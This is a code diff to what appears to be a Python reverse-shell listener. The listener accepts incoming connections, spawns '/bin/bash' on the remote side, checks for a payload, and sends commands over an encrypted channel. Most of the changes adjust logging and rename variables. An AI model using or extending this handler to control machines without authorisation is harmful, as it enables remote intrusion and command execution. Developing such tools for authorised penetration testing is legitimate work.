@@ -45,6 +45,7 @@ def _sigtspt_check():
 def listen(host, port, py_state):
     if not py_state:
         sock = BashServerSocket()
+        logging.info(f"Started listener on {host, port}")
     else:
         sock = PyServerSocket()
 
@@ -54,7 +55,6 @@ def listen(host, port, py_state):
         logging.error("Address already in use")
         raise 
     
-    logging.info(f"Started listener on {host, port}")
 
     try:
         sock.listen()
@@ -125,7 +125,7 @@ class BashServerSocket():
         for s in readable:
             if s is self.server_socket:
                 self.client_socket, self.client_address = self.server_socket.accept()
-                logging.info(f"Connection established with {self.client_address}")
+                logging.info(f"Connection established with {self.client_address[0]}")
 
                 self.client_socket.setblocking(0)
 
@@ -136,10 +136,9 @@ class BashServerSocket():
     def is_shell(self):
         self.client_socket.sendall(f"/bin/bash 2>&1\n".encode())
         self.client_socket.sendall(f"echo hello{EXIT_CMD}".encode())
-        print("INFO:root:Validating if connection has shell.. ", end="")
+        print("INFO:root:Validating if connection has shell")
         time.sleep(0.1)
         check = self.send_command("echo THIS_IS_A_TEST_STRING_IGNORE_PLS")
-        print("ok!")
         if check:
             return True
         else:
@@ -233,23 +232,26 @@ class PyServerSocket():
     def listen(self):
         self.server_socket.listen(1)
         self.client_socket, self.client_address = self.server_socket.accept()
-        logging.info(f"Connection established with {self.client_address}")
+        logging.debug(f"Connection established with {self.client_address}")
 
     def is_shell(self):
-        self.enc = ServerPyEncryption()
-        self.client_socket.send(json.dumps({'p': self.enc.p, 'g': self.enc.g}).encode())
-        logging.info("Validating if connection has shell..")
-        check = pretty(self.send_command("echo hello"))
-        if check == "hello":
+        logging.debug("Validating if connection is from payload")
+        self.client_socket.sendall(b"echo pluh")
+        check = pretty(self.client_socket.recv(1024))
+        if check:
+            logging.info("Initializing interpreter")
+            self.crypto = ServerPyEncryption()
+            logging.debug("Starting handshake")
+            self.client_socket.send(json.dumps({'p': self.crypto.p, 'g': self.crypto.g}).encode())
             return True
         else:
             return False
 
     def send_command(self, command):
         chunk = b""
-        derived_key = self.enc.get_derived_key(self.client_socket)
+        derived_key = self.crypto.get_derived_key(self.client_socket)
 
-        encrypted_message = self.enc.encrypt_message(command, derived_key)
+        encrypted_message = self.crypto.encrypt_message(command, derived_key)
 
         self.client_socket.sendall(encrypted_message)
         data_length_bytes = self.client_socket.recv(4)
@@ -262,7 +264,7 @@ class PyServerSocket():
                 raise RuntimeError("socket connection broken")
             data_bytes.extend(chunk)
 
-        return self.enc.decrypt_message(chunk, derived_key)
+        return self.crypto.decrypt_message(chunk, derived_key)
 
     def close(self):
         self.client_socket.close()
